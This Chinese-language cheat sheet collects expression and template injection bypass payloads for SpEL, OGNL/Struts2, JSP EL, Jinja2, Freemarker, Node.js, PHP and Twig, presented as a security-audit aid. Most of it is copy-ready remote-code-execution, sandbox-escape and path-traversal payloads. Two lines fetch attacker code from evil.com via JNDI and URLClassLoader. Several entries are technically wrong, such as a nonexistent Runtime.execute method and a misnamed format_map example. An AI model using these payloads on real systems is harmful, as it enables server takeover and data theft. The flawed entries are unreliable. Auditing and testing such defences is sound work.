# 表达式注入绕过技巧

本文档汇总常见的表达式注入防护机制绕过技巧，用于深度安全审计和漏洞验证。

---

## 1. SpEL（Spring Expression Language）绕过技巧

### 1.1 T() 函数限制绕过

**防护机制**：禁用 `T()` 函数访问 Java 类

```java
// 防护代码
SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding()
    .build();
// T() 函数被禁用
```

**绕过技巧**：

#### 方式 1：使用对象属性获取类
```
# 防护：禁用 T(java.lang.Runtime)
# 绕过：通过对象的 getClass() 获取类对象

#{@java.lang.Runtime@getRuntime()}  # 使用 @bean 引用
#{#rt=T(java.lang.Runtime),#rt.getRuntime().exec('id')}

# 使用对象属性链
#{user.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}

# 通过 ClassUtils 获取类
#{T(org.springframework.util.ClassUtils).forName('java.lang.Runtime')}
```

#### 方式 2：使用 @bean 引用
```
# SpEL 支持 @bean 引用，如果应用中定义了可用的 bean
#{@someBean.class}
#{@someBean.getClass().forName('java.lang.Runtime')}

# 绕过 T() 限制
#{@beanName.someMethod()}  # 调用 bean 的方法
```

#### 方式 3：使用内置对象属性
```
# SpEL 上下文中的内置对象
#{T(java.lang.String).getBytes('id')}  # 使用已允许的类

# 链式调用获取运行时
#{#rt = T(java.lang.String).class.forName('java.lang.Runtime')}
```

#### 方式 4：绕过方法黑名单
```
# 防护：禁用 exec() 方法
# 绕过：使用其他方法名或反射

#{T(java.lang.Runtime).getRuntime().execute('id')}  # 不同方法名
#{T(java.lang.Runtime).getRuntime().loadLibrary('id')}

# 使用 ProcessBuilder
#{T(java.lang.ProcessBuilder)(T(java.util.Arrays).asList('id')).start()}
```

### 1.2 SimpleEvaluationContext 绕过

**防护机制**：使用 SimpleEvaluationContext 而不是 StandardEvaluationContext

```java
// 防护代码
ExpressionParser parser = new SpelExpressionParser();
EvaluationContext context = new SimpleEvaluationContext.Builder()
    .withRootObject(data)
    .build();
Expression expr = parser.parseExpression(userInput);
```

**绕过技巧**：

#### 方式 1：属性访问链
```
# SimpleEvaluationContext 限制了某些操作，但属性访问可能仍可用
#{user.password}  # 访问对象属性
#{user['password']}  # 使用索引访问

# 链式属性访问
#{user.admin.permissions.contains('ADMIN')}
```

#### 方式 2：方法调用绕过
```
# 某些 SimpleEvaluationContext 仍允许方法调用
#{user.getPassword()}  # 调用对象方法
#{#users.stream().filter(u -> u.isAdmin()).collect(...)}  # Lambda 表达式

# 使用流和函数式编程
#{#list.stream().map(u -> u.password).collect(T(java.util.stream.Collectors).toList())}
```

#### 方式 3：函数注册绕过
```
# 如果应用注册了自定义函数，可能被利用
#{#register.invoke('id')}  # 调用注册的函数
```

### 1.3 SpEL 版本和实现差异

**绕过技巧**：

#### 方式 1：版本特定的漏洞
```
# 不同版本的 Spring 有不同的漏洞
# Spring 4.1-4.2 的漏洞
#{T(java.lang.Runtime).getRuntime().exec('id')}

# Spring 4.3 修复了部分漏洞但可能有新漏洞
# 使用特定版本的绕过方式
```

#### 方式 2：编码绕过
```
# Unicode 编码绕过
#{T(java.lang.\u006cang.Runtime).getRuntime().exec('id')}

# 十进制转换
#{T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString((char)105))}

# 字符串拼接
#{T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).format("%s%s","i","d"))}
```

#### 方式 3：通过 ScriptEngine 绕过
```
# 如果应用中存在 ScriptEngine
#{T(javax.script.ScriptEngineManager).new().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec("id")')}

# 使用 Nashorn 引擎（Java 8-14）
#{T(jdk.nashorn.api.scripting.NashornScriptEngineFactory).new().getScriptEngine().eval('java.lang.Runtime.getRuntime().exec("id")')}
```

#### 方式 4：Spring Boot Actuator 利用
```
# 如果 Spring Boot Actuator 可访问
# 通过 /env 或 /jolokia 端点
#{T(org.springframework.cglib.core.ReflectUtils).defineClass('EvilClass',T(org.apache.commons.codec.binary.Base64).decodeBase64('...'),new javax.management.loading.MLet())}

# 通过 JNDI 注入
#{T(javax.naming.InitialContext).new().lookup('rmi://evil.com/Exploit')}
```

#### 方式 5：Property 访问绕过
```
# 使用系统属性
#{T(java.lang.System).getProperty('user.dir')}
#{T(java.lang.System).setProperty('evil','payload')}

# 环境变量
#{T(java.lang.System).getenv('PATH')}
#{T(java.lang.System).getenv()}

# 通过属性访问器绕过黑名单
#{systemProperties['user.dir']}
#{systemEnvironment['PATH']}
```

---

## 2. OGNL（Object-Graph Navigation Language）绕过技巧

### 2.1 黑名单绕过

**防护机制**：禁用危险类和方法

```
# 防护代码示例（Struts2）
OGNL 黑名单禁用：
- java.lang.Runtime
- java.lang.ProcessBuilder
- java.io.File
- @java.lang
```

**绕过技巧**：

#### 方式 1：使用 classLoader 绕过
```
# 原始被拦截：@java.lang.Runtime@getRuntime()
# 绕过：通过 ClassLoader

(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.start())

# 使用 getClassLoader()
(#classLoader=#context.get('xwork.ObjectFactory').getClassLoader()).(#defineTranslet=#classLoader.loadClass('javassist.ClassClassPath').getMethod('getDeclaredClasses',null))
```

#### 方式 2：使用 ProcessImpl 或其他类
```
# 绕过 ProcessBuilder 限制
(#cmd='id').(#proc=@java.lang.Runtime@getRuntime().exec(#cmd))

# 使用 UNIXProcess 或 ProcessImpl
(#p=@java.lang.Class@forName('java.lang.ProcessImpl').getMethod('start',new java.lang.String[]{}.getClass()).invoke(null,new java.lang.String[]{'id'}))
```

#### 方式 3：使用反射和字符串拼接
```
# 绕过关键字过滤
(#cmd='i'+'d').(#proc=@java.lang.Runtime@getRuntime().exec(#cmd))

# 使用 eval 在字符串中
(#cmd=new java.lang.String(new byte[]{105,100})).(#proc=@java.lang.Runtime@getRuntime().exec(#cmd))
```

### 2.2 Struts2 特定绕过

**防护机制**：多层安全配置（黑名单、沙箱等）

**绕过技巧**：

#### 方式 1：OGNL 注入点识别
```
# Struts2 在以下位置易受攻击：
- name 属性
- value 属性
- 某些标签属性

# 绕过：使用 OGNL 注入语法
<s:set var="x" value="@java.lang.Runtime@getRuntime().exec('id')"/>

# 参数注入
?name=(@java.lang.Runtime@getRuntime().exec('id'))
```

#### 方式 2：双重编码和混淆
```
# OGNL 处理双重转义
(%25 = %, %23 = #)
?param=%23(cmd)=id%26...

# 字符串混淆
(#cmd="\u0069\u0064")  # Unicode 编码
```

#### 方式 3：上下文变量利用
```
# 利用 Struts2 上下文中的变量
(#context['xwork.MethodAccessor.denyMethodExecution']=false)

# 访问 ActionContext
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)

# 获取 request、response 对象
(#req=@org.apache.struts2.ServletActionContext@getRequest())
(#res=@org.apache.struts2.ServletActionContext@getResponse())
```

#### 方式 4：SecurityMemberAccess 绕过
```
# Struts2 2.3.x 绕过
(#_memberAccess['allowStaticMethodAccess']=true)

# Struts2 2.5.x 绕过（excludedClasses/excludedPackageNames）
(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','test'))

# 使用反射修改 SecurityMemberAccess
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))
```

#### 方式 5：静态方法调用链
```
# 通过静态方法获取运行时
@java.lang.Runtime@getRuntime().exec('id')

# 通过 Class.forName
@java.lang.Class@forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')

# 使用 URLClassLoader 加载远程类
@java.net.URLClassLoader@newInstance({new java.net.URL('http://evil.com/evil.jar')}).loadClass('EvilClass').newInstance()
```

---

## 3. JSP EL（Expression Language）绕过技巧

### 3.1 EL 表达式过滤绕过

**防护机制**：禁用 EL 表达式或限制函数

```jsp
<!-- 防护代码 -->
<%@ page isELIgnored="false" %>
<!-- 或配置 EL 黑名单 -->
```

**绕过技巧**：

#### 方式 1：EL 函数调用绕过
```
# 原始被禁用
${Runtime.getRuntime().exec('id')}

# 绕过：通过 getClass() 链
${pageContext.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}

# 使用 HttpServletRequest
${pageContext.request.class.forName('java.lang.Runtime')}

# 使用 ApplicationContext
${application.class.forName('java.lang.Runtime')}
```

#### 方式 2：EL 注入在属性中
```
# EL 在不同上下文中的处理不同
<c:set var="x" value="${user_input}"/>

# 在 HTML 属性中
<input value="${user_input}">

# 绕过：利用上下文差异
${param.input}
${header.input}
${cookie.input}
```

### 3.2 JSTL 标签绕过

**防护机制**：限制标签和函数库

**绕过技巧**：

#### 方式 1：动态标签库调用
```jsp
<!-- 防护：禁用某些标签库 -->
<!-- 绕过：使用其他标签库或技巧 -->

<!-- c:set 标签中的 EL -->
<c:set var="x" value="${Runtime.getRuntime().exec('id')}"/>

<!-- forEach 中的表达式 -->
<c:forEach var="item" items="${items}">
  ${item.exec('id')}  <!-- 如果 item 是 Runtime 对象 -->
</c:forEach>
```

---

## 4. Jinja2 模板注入绕过

### 4.1 属性访问限制绕过

**防护机制**：禁用 `__` 属性访问

```python
# 防护代码
env = Environment()
env.globals['__builtins__'] = {}
```

**绕过技巧**：

#### 方式 1：绕过 __ 限制
```jinja2
# 防护禁用 __class__, __bases__ 等
# 绕过：使用 attr() 函数

{{ ''|attr('__class__') }}
{{ ''['__class__'] }}
{{ ''.__class__ }}  <!-- 某些模板引擎允许 -->

# 使用对象属性
{{ config.items() }}
{{ self }}
{{ self.__dict__ }}

# 编码绕过
{{ ''['\x5f\x5fclass\x5f\x5f'] }}  <!-- \x5f = _ -->
```

#### 方式 2：对象属性链绕过
```jinja2
# 获取基类和子类
{% set base = ''.__class__.__bases__[0] %}
{% for sub in base.__subclasses__() %}
  {% if 'os' in sub.__module__ %}
    {{ sub.__init__.__globals__['os'].system('id') }}
  {% endif %}
{% endfor %}

# 更短的链
{{ ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['os'].system('id') }}
```

### 4.2 Jinja2 内置对象滥用

**绕过技巧**：

#### 方式 1：利用内置过滤器和函数
```jinja2
# range 函数
{% for i in range(10) %}
  <!-- 可以用于 DoS -->
{% endfor %}

# select 过滤器中的表达式
{{ items|select('__class__')|list }}

# map 过滤器
{{ range(10)|map('__class__')|list }}

# rejectattr/selectattr
{{ items|selectattr('password')|list }}
```

#### 方式 2：字符串方法链
```jinja2
# 使用字符串方法获取类信息
{{ ''.__class__.__mro__[1].__subclasses__()[414].__init__.__globals__['system']('id') }}

# 遍历子类寻找目标
{% for item in ().__class__.__bases__[0].__subclasses__() %}
  {% if item.__name__ == 'Popen' %}
    {{ item(['id']).communicate() }}
  {% endif %}
{% endfor %}
```

### 4.3 Jinja2 宏和包含绕过

**绕过技巧**：

#### 方式 1：include 和 import 注入
```jinja2
# 如果用户输入被用于 include/import 路径
{% include user_input %}  <!-- 路径遍历 -->
{% import user_input as mod %}

# 绕过：使用相对路径
{% include '../../../etc/passwd' %}

# 使用内存文件（某些实现）
{% include 'file:///etc/passwd' %}
```

### 4.4 Jinja2 沙箱逃逸高级技巧

**防护机制**：启用 SandboxedEnvironment

```python
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
```

**绕过技巧**：

#### 方式 1：通过 lipsum 等全局函数
```jinja2
# lipsum 是 Jinja2 内置的全局函数
{{ lipsum.__globals__['os'].system('id') }}

# cycler 对象
{{ cycler.__init__.__globals__['os'].system('id') }}

# joiner 对象
{{ joiner.__init__.__globals__['os'].system('id') }}

# namespace 对象
{{ namespace.__init__.__globals__['os'].system('id') }}
```

#### 方式 2：利用 request 对象（Flask）
```jinja2
# Flask 中的 request 对象
{{ request.application.__globals__.__builtins__.__import__('os').system('id') }}

# config 对象
{{ config.__class__.__init__.__globals__['os'].system('id') }}

# url_for 函数
{{ url_for.__globals__['current_app'].config }}
{{ url_for.__globals__['__builtins__'].__import__('os').system('id') }}

# get_flashed_messages 函数
{{ get_flashed_messages.__globals__['__builtins__'].__import__('os').system('id') }}
```

#### 方式 3：数字和字符串技巧
```jinja2
# 使用数字构造字符
{{ ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id') }}

# 通过字符串方法
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate() }}

# 使用 dict.get
{{ {}.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__.get('sys').modules.get('os').system('id') }}
```

#### 方式 4：利用 format 和 format_map
```jinja2
# 字符串 format
{{ "{0.__class__.__bases__[0].__subclasses__}".format([]) }}

# format_map (Python 3.2+)
{{ "".__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id') }}
```

#### 方式 5：通过环境变量和配置
```jinja2
# 获取所有子类，寻找特定的类
{% for item in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in item.__name__ %}
    {{ item()._module.__builtins__['__import__']('os').system('id') }}
  {% endif %}
{% endfor %}

# 寻找 Popen
{% for i in range(500) %}
  {% if ().__class__.__base__.__subclasses__()[i].__name__ == 'Popen' %}
    {{ ().__class__.__base__.__subclasses__()[i](['id'],stdout=-1).communicate() }}
  {% endif %}
{% endfor %}
```

---

## 5. Freemarker 模板注入绕过

### 5.1 内置函数 (Built-ins) 绕过

**防护机制**：限制危险内置函数

```
# 防护禁用
?new()
?api
?enum()
```

**绕过技巧**：

#### 方式 1：使用其他内置函数
```
# 原始被禁用：?new('java.lang.ProcessBuilder')
# 绕过：使用 ?api 或其他方法

<#assign classLoader=object?api.class.getClassLoader()>
<#assign fileClass=classLoader.loadClass('java.io.File')>

# 使用 @
<#assign value='freemarker.template.utility.Execute'?new()>
${ value('id') }

# 使用 ObjectConstructor（如果可用）
<#assign oc=springMacroRequestContext.webApplicationContext.getBean('freemarker.template.utility.ObjectConstructor')>
${ oc('java.lang.ProcessBuilder','id').start() }
```

#### 方式 2：反射调用绕过
```
# 使用 ?api 访问底层 Java API
<#assign rt=object?api.class.forName('java.lang.Runtime')>
<#assign gm=rt.getDeclaredMethods()>

# 通过循环查找方法
<#list object?api.class.getDeclaredMethods() as method>
  <#if method.name == 'exec'>
    ...
  </#if>
</#list>
```

### 5.2 Freemarker 数据模型注入

**绕过技巧**：

#### 方式 1：利用数据模型对象
```
# 如果应用将 Java 对象暴露到模板中
<#assign cmd=springMacroRequestContext>  <!-- Spring 对象 -->

# 访问对象属性和方法
<#assign rt=cmd.webApplicationContext.getBean('xxx')>

# 通过构造函数链
<#assign rt=cmd?api.class.forName('java.lang.Runtime')>
```

---

## 6. Django/Jinja2 模板上下文污染

### 6.1 上下文变量注入

**防护机制**：过滤上下文变量

```python
# 防护代码
context = {'user': user}
# 限制暴露的变量
```

**绕过技巧**：

#### 方式 1：访问全局对象
```
# Django 模板中的特殊变量
{{ request }}
{{ request.session }}
{{ request.environ }}
{{ settings }}  <!-- SECRET_KEY 等 -->
{{ user }}
{{ user.is_staff }}

# 访问不应该暴露的对象
{{ debug }}  <!-- DEBUG 模式信息 -->
```

#### 方式 2：对象方法调用
```
# 模板中调用对象方法
{{ user.get_groups.all }}
{{ user.groups.all }}

# 数据库查询对象
{{ articles.all }}
{{ comments.filter(approved=True) }}

# 某些方法可能有副作用
{{ user.set_password('evil') }}
```

#### 方式 3：模板标签注入
```
# Django 自定义标签可能有漏洞
{% load custom_tags %}
{% dangerous_tag user_input %}

# 某些标签可能执行代码
{% if "python" in request.META.SERVER_SOFTWARE %}
  ...
{% endif %}
```

### 6.2 模板继承链注入

**绕过技巧**：

#### 方式 1：基础模板污染
```
# 如果用户可以选择基础模板
{% extends user_input %}

# 绕过：路径遍历
{% extends "../../../etc/passwd" %}

# 使用内存模板
{% extends "template_from_database" %}
```

---

## 7. 动态表达式评估引擎绕过

### 7.1 表达式解析器限制绕过

**防护机制**：限制表达式语法

```
# 防护代码示例（自定义表达式引擎）
allowedOperators = ['+', '-', '*', '/']
```

**绕过技巧**：

#### 方式 1：编码和混淆
```
# 原始被拦截：Runtime.getRuntime().exec('id')
# 绕过：字符串拼接和编码

Runtime['get' + 'Runtime']()['exec']('id')
Runtime[String.fromCharCode(103,101,116,82,117,110,116,105,109,101)]()

# Base64 编码
eval(atob('UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygnaWQnKQ=='))
```

#### 方式 2：沙箱逃逸
```
# 在沙箱环境中获取全局对象
(function(){return this;})()  // 在某些环境中获取 global

# 原型链污染
Object.prototype.polluted = true
```

---

## 8. 规则引擎表达式绕过

### 8.1 Drools 规则注入

**防护机制**：限制规则内容

```java
// 防护代码
RuleBase ruleBase = ...;
// 规则由管理员定义
```

**绕过技巧**：

#### 方式 1：规则条件注入
```
# Drools 规则语法
rule "name"
  when
    $fact : FactObject(field == userInput)  <!-- 注入点 -->
  then
    // action
  end

# 绕过：在条件中注入表达式
$fact : FactObject(field == Runtime.getRuntime().exec('id'))
```

#### 方式 2：规则操作注入
```
# 在规则的 then 部分注入
rule "name"
  when
    condition
  then
    System.out.println(Runtime.getRuntime().exec('id'));
    // ... 更多恶意代码
  end
```

---

## 9. 配置文件表达式求值绕过

### 9.1 YAML/JSON 配置表达式注入

**防护机制**：配置文件解析

```yaml
# 防护代码解析 YAML
config:
  expression: "${user.role}"  <!-- 可能被动态求值 -->
```

**绕过技巧**：

#### 方式 1：配置表达式注入
```yaml
# 如果应用动态求值配置中的表达式
email:
  to: "${admin.email}"  <!-- 注入点 -->
  subject: "${user.input}"

# 绕过：在值中注入表达式
to: "${Runtime.getRuntime().exec('id')}"
subject: "#{T(java.lang.Runtime).getRuntime().exec('id')}"
```

#### 方式 2：属性占位符注入
```
# Spring PropertyPlaceholder
${app.name}
${environment.property}

# 绕过：注入占位符引用
app.name = ${java.version}  <!-- 泄露信息 -->
```

---

## 10. JavaScript / Node.js 表达式注入绕过

### 10.1 eval() 和 Function() 绕过

**防护机制**：禁用 eval 和 Function 构造

**绕过技巧**：

#### 方式 1：间接 eval 调用
```javascript
// 原始被禁用：eval('code')
// 绕过：间接调用

window['eval']('code')
global['eval']('code')
this['eval']('code')

// 使用数组索引
[]['constructor']['constructor']('code')()

// 通过原型链
({}).__proto__.__proto__.constructor.constructor('code')()
```

#### 方式 2：模板字符串和标签函数
```javascript
// 标签模板
function evil(strings, ...values) {
  return eval(strings[0]);
}
evil`alert(1)`

// 嵌套模板字符串
`${`${`${process.mainModule.require('child_process').execSync('id')}`}`}`
```

#### 方式 3：vm 模块绕过（Node.js）
```javascript
// 如果 vm 模块可用
const vm = require('vm');
vm.runInNewContext('process.mainModule.require("child_process").execSync("id")');

// 绕过 vm 沙箱
const vm = require('vm');
const sandbox = {};
vm.createContext(sandbox);
vm.runInContext('this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")', sandbox);
```

#### 方式 4：Object.defineProperty 和 Proxy
```javascript
// 使用 Proxy 拦截
const handler = {
  get: function(target, prop) {
    if (prop === 'constructor') {
      return Function;
    }
    return target[prop];
  }
};
const proxy = new Proxy({}, handler);
proxy.constructor('return process')();
```

#### 方式 5：字符编码绕过
```javascript
// Unicode 编码
eval('\u0061\u006c\u0065\u0072\u0074(1)')

// 十六进制
eval('\x61\x6c\x65\x72\x74(1)')

// 八进制
eval('\141\154\145\162\164(1)')

// String.fromCharCode
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

### 10.2 Node.js 特定绕过

#### 方式 1：require 绕过
```javascript
// 原始：require('child_process')
// 绕过：

global.require('child_process')
process.mainModule.require('child_process')
module.constructor._load('child_process')

// 通过构造函数
(function(){return this.require})()('child_process')

// 使用 global.process
global.process.mainModule.constructor._load('child_process').execSync('id')
```

#### 方式 2：原型污染利用
```javascript
// 污染 Object.prototype
Object.prototype.polluted = 'yes'

// 利用原型链获取 require
({}).__proto__.__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')
```

## 11. PHP 表达式注入绕过

### 11.1 eval() 和动态函数调用绕过

**防护机制**：禁用 eval、assert、create_function

**绕过技巧**：

#### 方式 1：可变函数绕过
```php
// 原始被禁用：eval('code')
// 绕过：使用可变函数

$func = 'assert';
$func('phpinfo()');

$a = 'sys'.'tem';
$a('id');

// 使用数组
$arr = ['sys'.'tem'];
$arr[0]('id');
```

#### 方式 2：回调函数绕过
```php
// call_user_func
call_user_func('assert', 'phpinfo()');
call_user_func_array('assert', ['phpinfo()']);

// array_map
array_map('assert', ['phpinfo()']);

// array_filter
array_filter(['phpinfo()'], 'assert');

// usort
usort([1,2], 'assert');

// preg_replace_callback (PHP 5.5+)
preg_replace_callback('/.*/e', 'assert', 'phpinfo()');
```

#### 方式 3：魔术方法绕过
```php
// __call
class Evil {
  function __call($func, $args) {
    call_user_func_array($func, $args);
  }
}
$obj = new Evil();
$obj->assert('phpinfo()');

// __get
class Evil2 {
  function __get($name) {
    return 'system';
  }
}
$obj = new Evil2();
$obj->x('id');
```

#### 方式 4：字符串拼接和编码
```php
// 字符串拼接
$a = 'sys'.'tem';
$a('id');

// 字符编码
$a = "\x73\x79\x73\x74\x65\x6d";
$a('id');

// base64 解码
$a = base64_decode('c3lzdGVt');
$a('id');

// 异或运算
$a = ('>'<'<').('>'>'<').('('<'=').('>'>'<').('>'<'<').('='>'<');
$a('id');
```

### 11.2 Twig/Smarty 模板绕过

#### 方式 1：Twig 过滤器链
```twig
{# 使用 filter 过滤器 #}
{{ ['id']|filter('system') }}
{{ 'phpinfo'|filter('call_user_func') }}

{# map 过滤器 #}
{{ ['phpinfo']|map('call_user_func') }}

{# reduce 过滤器 #}
{{ ['system','id']|reduce((a,b) => a(b)) }}
```

#### 方式 2：Twig _self 对象
```twig
{# 访问环境对象 #}
{{ _self.env.registerUndefinedFilterCallback('exec') }}
{{ _self.env.getFilter('id') }}

{# 获取 loader #}
{{ _self.env.getLoader() }}
```

#### 方式 3：Smarty {php} 标签绕过
```smarty
{* 在某些版本中可用 *}
{php}system('id');{/php}

{* 使用 {literal} 标签 *}
{literal}
<script>alert(1)</script>
{/literal}
```

## 12. 防护机制检查清单

在进行安全审计时，检查以下防护机制：

| 防护机制 | 绕过难度 | 常见绕过方式 |
|---------|---------|----------|
| 黑名单过滤 | 低 | 编码、大小写混合、字符拆分 |
| 简单白名单 | 低 | 特殊字符、属性链、方法重载 |
| 沙箱隔离 | 中 | 对象属性链、反射、Gadget Chain |
| 上下文限制 | 中 | 内置对象、过滤器、模板标签 |
| 版本特定防护 | 中-高 | 版本漏洞、特定实现细节 |

---

## 13. 审计建议

### 高风险指标
- 用户输入直接拼接到表达式中
- 使用 eval() 或类似的动态执行函数
- 防护基于黑名单而非白名单
- 模板引擎暴露危险对象或函数
- 上下文中包含敏感信息

### 审计步骤
1. **识别表达式引擎**：定位所有表达式解析和执行点
2. **追踪输入来源**：确认用户输入如何到达表达式
3. **验证防护机制**：评估现有的过滤和沙箱方案
4. **尝试绕过**：使用本文档中的技巧验证防护的鲁棒性
5. **分析上下文**：检查暴露给表达式的对象和函数
6. **生成报告**：记录所有发现的漏洞

### 审计时多次尝试的重要性

**关键原则**：一次绕过失败不代表防护有效

在进行表达式注入漏洞审计时，必须进行多轮、多角度的绕过尝试：

#### 为什么需要多次尝试？

1. **防护机制可能不完整**：黑名单往往存在遗漏
2. **绕过方式多样化**：同一个目标可能有 5-10 种不同的绕过方式
3. **编码和混淆**：通过编码可以绕过简单的字符串匹配
4. **组合攻击**：某些绕过需要组合多种技巧
5. **版本差异**：不同版本的表达式引擎有不同的漏洞

#### 建议的尝试次数和策略

| 场景 | 最少尝试次数 | 建议策略 |
|-----|----------|---------|
| 黑名单过滤 | 5-10 次 | 编码、大小写、字符拼接、Unicode、属性访问 |
| 沙箱限制 | 5-8 次 | 属性链、反射、内置对象、原型链、全局函数 |
| 函数禁用 | 5-10 次 | 间接调用、别名、回调函数、魔术方法、过滤器 |
| 上下文限制 | 3-6 次 | 内置对象、全局变量、request 对象、配置对象 |
| 白名单限制 | 3-5 次 | 方法重载、属性访问、继承关系 |

#### 系统化绕过方法

**第一轮**：直接尝试
- 使用标准 payload 直接测试

**第二轮**：编码变换
- Unicode 编码
- 十六进制/八进制编码
- Base64 编码
- 字符串拼接

**第三轮**：间接访问
- 对象属性链
- 反射调用
- 原型链访问
- 构造函数访问

**第四轮**：替代方法
- 使用替代类或方法
- 回调函数
- 过滤器和标签
- 内置函数

**第五轮**：组合技巧
- 组合多种绕过方式
- 利用版本特定漏洞
- 上下文变量注入

#### 实例：SpEL T() 函数禁用的多次尝试

```
尝试 1：#{T(java.lang.Runtime).getRuntime().exec('id')}
结果：被拦截

尝试 2：#{T(java.lang.\u006cang.Runtime).getRuntime().exec('id')}
结果：被拦截（Unicode 编码）

尝试 3：#{user.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}
结果：成功！（通过对象属性链绕过）
```

### 验证修复
修复表达式注入漏洞时，确保：
- 避免动态表达式执行，优先使用静态预定义
- 使用白名单而非黑名单进行输入验证
- 使用安全的沙箱环境（SimpleEvaluationContext、受限上下文）
- 限制暴露给表达式的对象和函数
- 定期更新表达式引擎库到最新版本
- 进行安全代码审查和渗透测试
- **使用本文档中的多种绕过技巧验证修复的有效性**
